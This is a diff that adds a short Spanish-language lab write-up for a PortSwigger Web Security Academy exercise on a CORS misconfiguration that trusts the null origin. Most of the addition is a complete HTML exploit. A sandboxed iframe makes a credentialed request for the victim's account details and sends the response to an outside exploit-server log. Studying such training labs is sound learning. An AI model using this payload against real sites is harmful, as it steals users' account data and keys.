@@ -129,4 +129,34 @@ Si revisamos el log del servidor del atacante tendriamos que ver algo asi:
 `` ``
 
 
+# CORS vulnerability with trusted null origin
 
+Es parecido al laboratorio pasado solo que  ahora se pone el Origin: null y se ve reflejado en la respuesta
+para generar un origen null se usa un iframe.
+
+```
+
+<html>
+<head>
+<body>
+<iframe sandbox="allow-scripts" srcdoc="
+<script>
+ var xhr = new XMLHttpRequest();
+ var url = 'https://0a29001d04361e32c11ae084002a00db.web-security-academy.net'
+
+ xhr.onreadystatechange = function() {
+ if (xhr.readyState == XMLHttpRequest.DONE) {
+ fetch('https://exploit-0afc0054040a1e43c1cee0c801c60000.web-security-academy.net/log?key=' + xhr.responseText)
+    }
+ }
+
+
+ xhr.open('GET',url + '/accountDetails',true);
+ xhr.withCredentials = true;
+ xhr.send(null);
+
+</script>"></iframe>
+</body>
+</html>
+	
+```	
